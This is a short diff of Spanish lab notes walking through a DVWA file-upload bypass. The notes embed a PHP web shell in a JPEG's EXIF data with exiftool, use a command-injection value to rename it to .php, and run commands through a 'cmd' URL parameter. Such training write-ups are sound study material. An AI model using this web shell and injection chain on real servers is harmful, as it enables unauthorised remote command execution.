@@ -1,1 +1,29 @@
+++ Web Browser
+--- dvwa security = high
+--- Upload ---> archivo.php ---> la subida no es permitida (ya que el servidor está a la espera de sólo algún archivo .png o .jpg
+
+++ Terminal
+--- exiftool -DocumentName="<h1>F1uffyGoat<br><?php if (is set(\$_REQUEST['cmd']))
+{echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';}_halt_compiler();?></h1>"<archivo.jpeg>
+---- Dos archivos serán creados:
+------- archivo.jpeg
+------- archivo_original.jpeg
+
+++ Web Browser
+--- Subir la imagen
+--- Modificar la url al final siguiendo la siguiente sintaxis: 
+----- uploads/<archivo.jpeg>
+--- Command injection tab
+--- 127.0.0.0|mv ../../hackable/uploads/<archivo.php>
+--- File upload
+--- Modificar la url al final siguiendo la sintaxis:
+----- uploads/<archivo.php>
+----- Nos aparecerá la carga del código php lo que nos permite cambiar el url
+al final para ejecutar código php:
+------- /uploads/1.php?cmd=ls
+
+
+++ Burp Suite
+
+
 
